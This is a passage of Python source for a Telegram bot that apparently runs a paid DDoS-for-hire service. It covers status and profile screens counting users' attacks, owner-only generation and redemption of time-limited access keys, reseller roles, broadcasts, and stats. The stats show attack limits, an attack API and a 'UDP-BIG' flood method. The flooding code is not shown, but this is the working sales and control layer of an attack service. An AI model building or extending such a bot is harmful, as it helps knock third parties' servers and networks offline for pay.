                    + "┃   👤 𝗬𝗢𝗨𝗥 𝗜𝗡𝗙𝗢\n"
                    + "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"┣ 🎭 ʀᴏʟᴇ ➪ {role}\n"
                    + f"┣ 🎯 ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋꜱ ➪ <b>{user_attacks}</b>\n"
                    + f"┣ ⏰ ᴛɪᴍᴇ ➪ <b>{time_left}</b>\n"
                    + f"┗ 🕐 ɴᴏᴡ ➪ <code>{ist_time_str()} IST</code>\n\n"
                    + "≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n"
                    + "≈ 🏹 𝖱𝖤𝖠𝖣𝖸 𝖳𝖮 𝖠𝖳𝖳𝖠𝖢𝖪  ≈\n"
                    + "≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈"
                )
                return txt
            except Exception as e:
                HEALTH["total_errors"] += 1
                print(f"Build Status Error: {e}")
                traceback.print_exc()
                return "⚠️ <b>ꜱᴛᴀᴛᴜꜱ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ</b>"

        try:
            bot.edit_message_text(
                chat_id=cid, message_id=status_msg.message_id,
                text=build_status(), parse_mode="HTML"
            )
        except Exception as e:
            print(f"Status First Edit Error: {e}")

        def auto_update():
            last_text = None
            for _ in range(400):
                time.sleep(3)
                try:
                    new_text = build_status()
                    if new_text != last_text:
                        bot.edit_message_text(
                            chat_id=cid, message_id=status_msg.message_id,
                            text=new_text, parse_mode="HTML"
                        )
                        last_text = new_text
                except Exception as e:
                    err = str(e)
                    if "message is not modified" in err.lower(): continue
                    if "Too Many Requests" in err or "retry after" in err.lower():
                        time.sleep(5); continue
                    break

        threading.Thread(target=auto_update, daemon=True).start()
    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"❌ do_status error: {e}")
        traceback.print_exc()

@bot.message_handler(commands=['status'])
def cmd_status(msg):
    do_status(msg)

# ============= PROFILE =============
def do_profile(msg):
    try:
        if check_ban(msg): return
        uid = msg.from_user.id
        cid = msg.chat.id

        try: profile_msg = bot.send_message(cid, "👤 ʟᴏᴀᴅɪɴɢ ᴘʀᴏꜰɪʟᴇ...")
        except Exception as e: print(f"Profile send error: {e}"); return

        def build_profile():
            try:
                now = datetime.now()
                u = ensure_dict(data.get("users", {})).get(str(uid), {})
                if not isinstance(u, dict): u = {}
                role = "👑 ᴏᴡɴᴇʀ" if is_owner(uid) else ("💼 ʀᴇꜱᴇʟʟᴇʀ" if is_reseller(uid) else "👤 ᴜꜱᴇʀ")
                time_left = time_remaining(uid)
                time_detail = time_remaining_lines(uid)

                expiry_date = "N/A"
                if u.get('key_expiry'):
                    exp = safe_parse_dt(u['key_expiry'])
                    if exp:
                        ist = exp + timedelta(hours=5, minutes=30)
                        expiry_date = ist.strftime('%d %b %Y, %I:%M:%S %p')

                joined_full = "N/A"
                if u.get('joined_ist'): joined_full = str(u['joined_ist']) + " IST"
                elif u.get('joined_at'):
                    jt = safe_parse_dt(u['joined_at'])
                    if jt:
                        ist = jt + timedelta(hours=5, minutes=30)
                        joined_full = ist.strftime('%d %b %Y, %I:%M:%S %p') + " IST"

                account_age = "N/A"
                if u.get('joined_at'):
                    jt = safe_parse_dt(u['joined_at'])
                    if jt:
                        delta = now - jt
                        total_sec = int(delta.total_seconds())
                        days = total_sec // 86400
                        hrs = (total_sec % 86400) // 3600
                        mins = (total_sec % 3600) // 60
                        secs = total_sec % 60
                        parts = []
                        if days > 0: parts.append(f"{days}ᴅ")
                        if hrs > 0: parts.append(f"{hrs}ʜ")
                        if mins > 0: parts.append(f"{mins}ᴍ")
                        parts.append(f"{secs}ꜱ")
                        account_age = " ".join(parts)

                total_atk = safe_int(u.get('total_attacks', 0))
                username_display = msg.from_user.username or "N/A"
                first_name = msg.from_user.first_name or "User"
                is_active = has_valid_key(uid)
                status_icon = "🟢 ᴀᴄᴛɪᴠᴇ" if is_active else "🔴 ɪɴᴀᴄᴛɪᴠᴇ"

                txt = (
                    "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                    "▰             🐮 𝕐𝕆𝕌ℝ ℙℝ𝕆𝔽𝕀𝕃𝔼 🐞              ▰\n"
                    "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃   📋 𝗕𝗔𝗦𝗜𝗖 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 📋\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"┣ 🆔 ɪᴅ ➪ <code>{uid}</code>\n"
                    f"┣ 📛 ɴᴀᴍᴇ ➪ <b>{escape_html(first_name)}</b>\n"
                    f"┣ 🔗 ᴜꜱᴇʀɴᴀᴍᴇ ➪ @{escape_html(username_display)}\n"
                    f"┣ 🎭 ʀᴏʟᴇ ➪ {role}\n"
                    f"┗ ⚡ ꜱᴛᴀᴛᴜꜱ ➪ {status_icon}\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃   ⏰ 𝗧𝗜𝗠𝗘 𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 ⏰\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"┣ ⏳ ᴛᴏᴛᴀʟ ➪ <b>{time_left}</b>\n"
                    f"{time_detail}\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃   📅 𝗝𝗢𝗜𝗡 & 𝗞𝗘𝗬 𝗜𝗡𝗙𝗢 📅\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"┣ 📥 ᴊᴏɪɴᴇᴅ ➪ <code>{joined_full}</code>\n"
                    f"┣ 📆 ᴇxᴘɪʀᴇꜱ ➪ <code>{expiry_date}</code>\n"
                    f"┗ 🕐 ᴀᴄᴄᴛ ᴀɢᴇ ➪ <b>{account_age}</b>\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃   📊 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦 📊\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"┣ 💀 ᴀᴛᴛᴀᴄᴋꜱ ➪ <b>{total_atk}</b>\n"
                    f"┗ 🕐 ᴄᴜʀʀᴇɴᴛ ➪ <code>{ist_full_str()} IST</code>\n\n"
                )

                if is_active:
                    txt += "╔══════════════════════════════╗\n║   ✅ 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗔𝗖𝗧𝗜𝗩𝗘 ✅   ║\n╚══════════════════════════════╝"
                else:
                    txt += "╔══════════════════════════════╗\n║   ❌ 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗜𝗡𝗔𝗖𝗧𝗜𝗩𝗘 ❌   ║\n╚══════════════════════════════╝"

                return txt
            except Exception as e:
                print(f"Build Profile Error: {e}"); traceback.print_exc()
                return "⚠️ <b>ᴘʀᴏꜰɪʟᴇ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ</b>"

        try:
            bot.edit_message_text(
                chat_id=cid, message_id=profile_msg.message_id,
                text=build_profile(), parse_mode="HTML"
            )
        except Exception as e: print(f"Profile First Edit Error: {e}")

        def auto_update_profile():
            last_text = None
            for _ in range(400):
                time.sleep(3)
                try:
                    new_text = build_profile()
                    if new_text != last_text:
                        bot.edit_message_text(
                            chat_id=cid, message_id=profile_msg.message_id,
                            text=new_text, parse_mode="HTML"
                        )
                        last_text = new_text
                except Exception as e:
                    err = str(e)
                    if "message is not modified" in err.lower(): continue
                    if "Too Many Requests" in err or "retry after" in err.lower():
                        time.sleep(5); continue
                    break

        threading.Thread(target=auto_update_profile, daemon=True).start()
    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"❌ do_profile error: {e}")

@bot.message_handler(commands=['profile'])
def cmd_profile(msg):
    do_profile(msg)

# ============= KEY SYSTEM =============
def parse_duration(text):
    text = text.lower().strip()
    word_map = {
        "second": 1, "seconds": 1, "sec": 1, "s": 1,
        "minute": 60, "minutes": 60, "min": 60, "m": 60,
        "hour": 3600, "hours": 3600, "hr": 3600, "h": 3600,
        "day": 86400, "days": 86400, "d": 86400,
        "week": 604800, "weeks": 604800, "w": 604800,
        "month": 2592000, "months": 2592000, "mo": 2592000,
        "year": 31536000, "years": 31536000, "y": 31536000,
    }
    m = re.match(r'^(\d+)\s*([a-z]+)$', text)
    if m:
        num = int(m.group(1)); suf = m.group(2)
        if suf in word_map: return num * word_map[suf]
        return None
    if text.isdigit(): return int(text) * 86400
    if text in word_map: return word_map[text]
    return None

def human_readable(seconds):
    if seconds >= 31536000 and seconds % 31536000 == 0: return f"{seconds // 31536000} ʏᴇᴀʀ"
    if seconds >= 2592000 and seconds % 2592000 == 0: return f"{seconds // 2592000} ᴍᴏɴᴛʜ"
    if seconds >= 604800 and seconds % 604800 == 0: return f"{seconds // 604800} ᴡᴇᴇᴋ"
    if seconds >= 86400 and seconds % 86400 == 0: return f"{seconds // 86400} ᴅᴀʏ"
    if seconds >= 3600 and seconds % 3600 == 0: return f"{seconds // 3600} ʜᴏᴜʀ"
    if seconds >= 60 and seconds % 60 == 0: return f"{seconds // 60} ᴍɪɴᴜᴛᴇ"
    return f"{seconds} ꜱᴇᴄᴏɴᴅ"

def do_genkey(msg):
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║       🔑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗞𝗘𝗬 𝗠𝗔𝗞𝗘𝗥 🎛️         ║\n"
                "╚══════════════════════════╝\n\n"
                "📝 <code>/genkey 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 [𝗔𝗠𝗢𝗨𝗡𝗧] [𝗡𝗔𝗠𝗘]</code>\n\n"
                "⚡ ꜱᴇᴄ ➪ <code>10s</code> | ⏱️ ᴍɪɴ ➪ <code>30m</code>\n"
                "🕐 ʜʀ ➪ <code>1h</code> | 📅 ᴅᴀʏ ➪ <code>1d</code>\n\n"
                "📌 <b>ᴇxᴀᴍᴘʟᴇꜱ:</b>\n"
                "<code>/genkey 1d 5</code>\n"
                "<code>/genkey 1month 10 VIP</code>",
                parse_mode="HTML")
            return

        secs = parse_duration(p[1])
        if not secs or secs < 1:
            safe_reply(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ᴅᴜʀᴀᴛɪᴏɴ!</b>", parse_mode="HTML"); return

        try:
            amt = int(p[2]) if len(p) > 2 else 1
            custom_name = p[3].upper() if len(p) > 3 else None
        except:
            safe_reply(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ!</b>", parse_mode="HTML"); return

        keys = []
        for _ in range(amt):
            if custom_name:
                rp = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
                formatted = f"{custom_name}-{rp[:4]}-{rp[4:8]}-{rp[8:12]}"
            else:
                formatted = fmt_key(gen_key(16))
            data["keys"][formatted] = {
                "seconds": secs, "duration_text": human_readable(secs),
                "created_at": datetime.now().isoformat(),
                "used": False, "used_by": None
            }
            keys.append(formatted)
        save_data(data)

        dur_text = human_readable(secs)

        txt = (
            "╔══════════════════════════════╗\n"
            "║   ✅ 𝗞𝗘𝗬𝗦 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗 ✅          ║\n"
            "╚══════════════════════════════╝\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   💎 𝗞𝗘𝗬 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 💎\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┣ 🔢 ᴛᴏᴛᴀʟ ➪ <code>{amt}</code>\n"
            f"┣ ⏰ ᴅᴜʀᴀᴛɪᴏɴ ➪ <code>{dur_text}</code>\n"
            f"┗ 🎭 ᴛʏᴘᴇ ➪ <code>{'ᴘʀᴇᴍɪᴜᴍ' if custom_name else 'ꜱᴛᴀɴᴅᴀʀᴅ'}</code>\n"
        )
        if custom_name:
            txt += f"🏷️ ɴᴀᴍᴇ ➪ <code>{custom_name}</code>\n"

        txt += "\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n┃   🔑 𝗬𝗢𝗨𝗥 𝗞𝗘𝗬𝗦 🔑\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        for i, k in enumerate(keys, 1):
            txt += f"<b>{i:02d}.</b> <code>{k}</code>\n"
        txt += "\n╔══════════════════════════════╗\n"
        txt += "║   💠 𝗥𝗘𝗗𝗘𝗘𝗠 💠                   ║\n"
        txt += "╚══════════════════════════════╝\n"
        txt += "┗➤ <code>/redeem KEY</code>"
        safe_reply(msg, txt, parse_mode="HTML")
    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"❌ do_genkey error: {e}")

@bot.message_handler(commands=['genkey', 'gen'])
def cmd_gen(msg): do_genkey(msg)

@bot.message_handler(commands=['redeem'])
def cmd_redeem(msg):
    try:
        if check_ban(msg): return
        uid = msg.from_user.id
        p = msg.text.split()
        if len(p) < 2:
            safe_reply(msg, "╔══════════════════════════════╗\n║   🔑 𝗥𝗘𝗗𝗘𝗘𝗠 𝗞𝗘𝗬 🔑   ║\n╚══════════════════════════════╝\n\n📝 <code>/redeem YOUR-KEY</code>", parse_mode="HTML"); return
        key = p[1].strip().upper()
        if key not in ensure_dict(data.get("keys", {})):
            safe_reply(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ᴋᴇʏ!</b>", parse_mode="HTML"); return
        kinfo = data["keys"][key]
        if kinfo.get("used"):
            safe_reply(msg, "❌ <b>ᴀʟʀᴇᴀᴅʏ ᴜꜱᴇᴅ!</b>", parse_mode="HTML"); return

        secs = safe_int(kinfo.get("seconds", 86400), 86400)
        expiry = datetime.now() + timedelta(seconds=secs)
        data["users"].setdefault(str(uid), {})
        existing = data["users"][str(uid)].get("key_expiry")
        if existing:
            old_exp = safe_parse_dt(existing)
            if old_exp and old_exp > datetime.now():
                expiry = old_exp + timedelta(seconds=secs)
        data["users"][str(uid)]["key_expiry"] = expiry.isoformat()
        data["users"][str(uid)]["username"] = msg.from_user.username or msg.from_user.first_name
        kinfo["used"] = True; kinfo["used_by"] = uid
        kinfo["used_at"] = datetime.now().isoformat()
        save_data(data)

        if str(uid) in _expiry_notified: del _expiry_notified[str(uid)]
        expiry_ist = (expiry + timedelta(hours=5, minutes=30)).strftime('%d %b %Y, %I:%M:%S %p')

        safe_reply(msg,
            "╔══════════════════════════════╗\n"
            "║   ✅ 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 ✅   ║\n"
            "╚══════════════════════════════╝\n\n"
            f"┣ ⏰ ᴀᴅᴅᴇᴅ ➪ <b>+{human_readable(secs)}</b>\n"
            f"┣ 📅 ᴇxᴘɪʀᴇꜱ ➪ <code>{expiry_ist} IST</code>\n"
            f"┗ ⏳ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{time_remaining(uid)}</b>",
            parse_mode="HTML")
    except Exception as e:
        print(f"❌ cmd_redeem error: {e}")

# ============= OWNER PANEL =============
@bot.message_handler(commands=['panel'])
def cmd_panel(msg):
    try:
        if not is_owner(msg.from_user.id): return
        safe_reply(msg,
            "╔══════════════════════════╗\n"
            "║        📊 🅾︎🆆︎🅽︎🅴︎🆁︎ 🅿︎🅰︎🅽︎🅴︎🅻︎ 🔓           ║\n"
            "╚══════════════════════════╝\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   ⚡ 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            "┣ 👑 /panel ➪ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ\n"
            "┣ 👥 /users ➪ ʟɪᴠᴇ ᴜꜱᴇʀꜱ\n"
            "┣ 📊 /stats ➪ ꜱᴛᴀᴛꜱ\n"
            "┣ 📢 /broadcast MSG\n"
            "┣ 🚫 /ban ID REASON\n"
            "┣ ✅ /unban ID\n"
            "┣ 🔑 /genkey 1d 5\n"
            "┣ 📡 /setapi URL TOKEN\n"
            "┣ 🧪 /testapi\n"
            "┣ ⏱️ /setmaxtime SEC\n"
            "┣ ⏸️ /setcooldown SEC\n"
            "┣ 🔧 /maintenance\n"
            "┗ ⚙️ /settings",
            parse_mode="HTML")
    except Exception as e: print(f"❌ cmd_panel error: {e}")

# ============= USERS LIVE =============
def do_users(msg):
    try:
        if not is_owner(msg.from_user.id): return
        if not ensure_dict(data.get("users", {})):
            safe_reply(msg, "📂 <b>ɴᴏ ᴜꜱᴇʀꜱ.</b>", parse_mode="HTML"); return

        users_msg = safe_send(msg.chat.id, "👥 ʟᴏᴀᴅɪɴɢ ʟɪᴠᴇ ᴜꜱᴇʀꜱ...")
        if not users_msg: return

        def build_users_live():
            try:
                now = datetime.now()
                total = len(ensure_dict(data.get("users", {})))
                txt = (
                    "╔══════════════════════════════╗\n"
                    "║   👥 𝗟𝗜𝗩𝗘 𝗨𝗦𝗘𝗥𝗦 𝗟𝗜𝗦𝗧 👥           ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃ 📊 ᴛᴏᴛᴀʟ: <b>{total}</b> ᴜꜱᴇʀꜱ\n"
                    f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                )
                for u_id, u in list(ensure_dict(data.get("users", {})).items())[:20]:
                    if not isinstance(u, dict): continue
                    if u_id in ensure_dict(data.get("banned_users", {})):
                        time_str = "🚫 ʙᴀɴɴᴇᴅ"; status = "🚫"
                    elif u.get('key_expiry'):
                        exp = safe_parse_dt(u['key_expiry'])
                        if exp:
                            rem = exp - now
                            total_sec = int(rem.total_seconds())
                            if total_sec <= 0:
                                time_str = "❌ ᴇxᴘɪʀᴇᴅ"; status = "🔴"
                            else:
                                d = total_sec // 86400; h = (total_sec % 86400) // 3600
                                m = (total_sec % 3600) // 60; s = total_sec % 60
                                time_str = f"{d:02d}ᴅ {h:02d}ʜ {m:02d}ᴍ {s:02d}ꜱ"; status = "🟢"
                        else:
                            time_str = "❌ ɴᴏ ᴋᴇʏ"; status = "🔴"
                    else:
                        time_str = "❌ ɴᴏ ᴋᴇʏ"; status = "🔴"

                    uname = escape_html(u.get('username', 'N/A'))
                    atks = safe_int(u.get('total_attacks', 0))
                    txt += f"{status} <code>{u_id}</code>\n"
                    txt += f"   ┣ 👤 @{uname}\n"
                    txt += f"   ┣ ⏰ <b>{time_str}</b>\n"
                    txt += f"   ┗ 💀 {atks} ᴀᴛᴋꜱ\n\n"
                if total > 20: txt += f"\n... ᴀɴᴅ {total - 20} ᴍᴏʀᴇ ᴜꜱᴇʀꜱ\n"
                txt += f"\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n┃ 🕐 {ist_time_str()} IST\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                return txt
            except Exception as e:
                print(f"Build users error: {e}"); return "⚠️ ᴜꜱᴇʀꜱ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ"

        try:
            bot.edit_message_text(
                chat_id=users_msg.chat.id, message_id=users_msg.message_id,
                text=build_users_live(), parse_mode="HTML"
            )
        except: pass

        def auto_update_users():
            last_text = None
            for _ in range(200):
                time.sleep(3)
                try:
                    new_text = build_users_live()
                    if new_text != last_text:
                        bot.edit_message_text(
                            chat_id=users_msg.chat.id, message_id=users_msg.message_id,
                            text=new_text, parse_mode="HTML"
                        )
                        last_text = new_text
                except Exception as e:
                    err = str(e)
                    if "message is not modified" in err.lower(): continue
                    if "Too Many Requests" in err or "retry after" in err.lower():
                        time.sleep(5); continue
                    break

        threading.Thread(target=auto_update_users, daemon=True).start()
    except Exception as e:
        print(f"❌ do_users error: {e}")

@bot.message_handler(commands=['users'])
def cmd_users(msg): do_users(msg)

# ============= BROADCAST =============
@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(msg):
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split(maxsplit=1)
        if len(p) < 2:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║       📢 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 📢        ║\n"
                "╚══════════════════════════╝\n\n"
                "📝 <code>/broadcast YOUR MESSAGE</code>\n\n"
                "📌 <code>/broadcast 🔥 New update!</code>\n\n"
                f"👥 ᴛᴏᴛᴀʟ: <b>{len(ensure_dict(data.get('users', {})))}</b>",
                parse_mode="HTML")
            return

        text = p[1]
        total = len(ensure_dict(data.get("users", {})))
        sent = 0; failed = 0; banned_skip = 0

        broadcast_header = (
            "╔══════════════════════════════╗\n"
            "║   📢 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗔𝗡𝗡𝗢𝗨𝗡𝗖𝗘𝗠𝗘𝗡𝗧 📢   ║\n"
            "╚══════════════════════════════╝\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   💎 𝗙𝗥𝗢𝗠 𝗢𝗪𝗡𝗘𝗥 💎\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        )
        broadcast_footer = (
            "\n\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   ⚡ 𝗕𝗢𝗧 𝗧𝗘𝗔𝗠 ⚡\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┣ 👑 ᴏᴡɴᴇʀ ɪᴅ ➪ <code>{BOT_OWNER}</code>\n"
            f"┗ 📅 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>"
        )
        full_message = broadcast_header + text + broadcast_footer

        status_msg = bot.reply_to(msg,
            "📤 <b>ꜱᴇɴᴅɪɴɢ ᴛᴏ " + str(total) + " ᴜꜱᴇʀꜱ...</b>",
            parse_mode="HTML")

        def do_broadcast():
            nonlocal sent, failed, banned_skip
            for i, uid_str in enumerate(list(ensure_dict(data.get("users", {})).keys()), 1):
                if uid_str in ensure_dict(data.get("banned_users", {})):
                    banned_skip += 1; continue
                try:
                    bot.send_message(int(uid_str), full_message, parse_mode="HTML")
                    sent += 1
                except: failed += 1

                if i % 5 == 0 or i == total:
                    try:
                        bot.edit_message_text(
                            chat_id=status_msg.chat.id, message_id=status_msg.message_id,
                            text=(
                                f"📤 <b>ᴘʀᴏɢʀᴇꜱꜱ:</b> {i}/{total}\n"
                                f"✅ ꜱᴇɴᴛ: {sent}\n"
                                f"❌ ꜰᴀɪʟᴇᴅ: {failed}\n"
                                f"🚫 ʙᴀɴɴᴇᴅ: {banned_skip}"
                            ), parse_mode="HTML"
                        )
                    except: pass
                time.sleep(0.05)

            try:
                bot.edit_message_text(
                    chat_id=status_msg.chat.id, message_id=status_msg.message_id,
                    text=(
                        f"✅ <b>ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴅᴏɴᴇ!</b>\n\n"
                        f"✅ ꜱᴇɴᴛ: {sent}\n❌ ꜰᴀɪʟᴇᴅ: {failed}\n🚫 ʙᴀɴɴᴇᴅ: {banned_skip}"
                    ), parse_mode="HTML"
                )
            except: pass

        threading.Thread(target=do_broadcast, daemon=True).start()
    except Exception as e: print(f"❌ cmd_broadcast error: {e}")

# ============= STATS =============
def do_stats(msg):
    try:
        if not is_owner(msg.from_user.id): return
        used_keys = sum(1 for k, v in ensure_dict(data.get("keys", {})).items() if isinstance(v, dict) and v.get('used'))
        unused_keys = len(ensure_dict(data.get("keys", {}))) - used_keys
        uptime_sec = int((datetime.now() - BOT_START_TIME).total_seconds())
        days = uptime_sec // 86400; hrs = (uptime_sec % 86400) // 3600
        mins = (uptime_sec % 3600) // 60; secs = uptime_sec % 60
        uptime_str = f"{days:02d}ᴅ {hrs:02d}ʜ {mins:02d}ᴍ {secs:02d}ꜱ"

        api_status = HEALTH.get("api_status", "🟡 ᴜɴᴋɴᴏᴡɴ")
        api_ping = safe_int(HEALTH.get("last_api_ping_ms", 0))
        api_success = safe_int(HEALTH.get("api_success", 0))
        api_failed = safe_int(HEALTH.get("api_failed", 0))
        total_errors = safe_int(HEALTH.get("total_errors", 0))
        total_msgs = safe_int(HEALTH.get("total_messages", 0))
        total_cmds = safe_int(HEALTH.get("total_commands", 0))
        total_attacks_h = safe_int(HEALTH.get("total_attacks", 0))

        txt = (
            "╔══════════════════════════╗\n"
            "║            📊 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗦𝗧𝗔𝗧𝗦 📊              ║\n"
            "╚══════════════════════════╝\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   👥 𝗨𝗦𝗘𝗥𝗦\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┣ 👥 ᴛᴏᴛᴀʟ ➪ <b>{len(ensure_dict(data.get('users', {})))}</b>\n"
            f"┣ 👑 ᴀᴅᴍɪɴꜱ ➪ <b>{len(ensure_dict(data.get('admins', {})))}</b>\n"
            f"┣ 💼 ʀᴇꜱᴇʟʟᴇʀꜱ ➪ <b>{len(ensure_dict(data.get('resellers', {})))}</b>\n"
            f"┗ 🚫 ʙᴀɴɴᴇᴅ ➪ <b>{len(ensure_dict(data.get('banned_users', {})))}</b>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   🔑 𝗞𝗘𝗬𝗦\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┣ 🔑 ᴛᴏᴛᴀʟ ➪ <b>{len(ensure_dict(data.get('keys', {})))}</b>\n"
            f"┣ ✅ ᴜꜱᴇᴅ ➪ <b>{used_keys}</b>\n"
            f"┗ 🆓 ᴀᴠᴀɪʟ ➪ <b>{unused_keys}</b>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   💀 𝗔𝗧𝗧𝗔𝗖𝗞𝗦\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┣ 💀 ᴛᴏᴛᴀʟ ➪ <b>{len(ensure_list(data.get('attack_logs', [])))}</b>\n"
            f"┣ ⏱️ ᴍᴀx ➪ <b>{get_setting('max_attack_time', 300)}ꜱ</b>\n"
            f"┗ ⏸️ ᴄᴅ ➪ <b>{get_setting('user_cooldown', 5)}ꜱ</b>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   💚 𝗛𝗘𝗔𝗟𝗧𝗛\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┣ 📡 ᴀᴘɪ ➪ {api_status}\n"
            f"┣ ⚡ ᴘɪɴɢ ➪ <b>{api_ping}ᴍꜱ</b>\n"
            f"┣ ✅ ᴀᴘɪ ᴏᴋ ➪ <b>{api_success}</b>\n"
            f"┣ ❌ ᴀᴘɪ ꜰᴀɪʟ ➪ <b>{api_failed}</b>\n"
            f"┣ 💬 ᴍꜱɢꜱ ➪ <b>{total_msgs}</b>\n"
            f"┣ ⚙️ ᴄᴍᴅꜱ ➪ <b>{total_cmds}</b>\n"
            f"┣ 💀 ᴀᴛᴋꜱ ➪ <b>{total_attacks_h}</b>\n"
            f"┗ ⚠️ ᴇʀʀᴏʀꜱ ➪ <b>{total_errors}</b>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   🎨 𝗖𝗢𝗡𝗧𝗘𝗡𝗧\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┣ ❄ ꜱᴛɪᴄᴋᴇʀꜱ ➪ <b>{len(ensure_list(data.get('stickers', [])))}</b>\n"
            f"┣ 📹 ᴠɪᴅᴇᴏꜱ ➪ <b>{len(ensure_list(data.get('videos', [])))}</b>\n"
            f"┗ 🎬 ᴘʏꜰ ➪ <b>{len(ensure_list(data.get('pyf_videos', [])))}</b>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   ⚙️ 𝗦𝗬𝗦𝗧𝗘𝗠\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┣ ⏱️ ᴜᴘᴛɪᴍᴇ ➪ <b>{uptime_str}</b>\n"
            f"┣ 🔧 ᴍᴀɪɴᴛ ➪ <b>{'🟢 ᴏɴ' if get_setting('maintenance_mode', False) else '🔴 ᴏꜰꜰ'}</b>\n"
            f"┣ 📡 ᴍᴇᴛʜᴏᴅ ➪ <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n"
            f"┗ 🕐 ɴᴏᴡ ➪ <code>{ist_time_str()} IST</code>\n\n"
            "╔══════════════════════════╗\n"
            "║               🤖 𝗕𝗢𝗧 𝗢𝗡𝗟𝗜𝗡𝗘 🗳️                  ║\n"
            "╚══════════════════════════╝"
        )
        safe_reply(msg, txt, parse_mode="HTML")
    except Exception as e: print(f"❌ do_stats error: {e}")

@bot.message_handler(commands=['stats'])
def cmd_stats(msg): do_stats(msg)

# ============= BAN/UNBAN =============
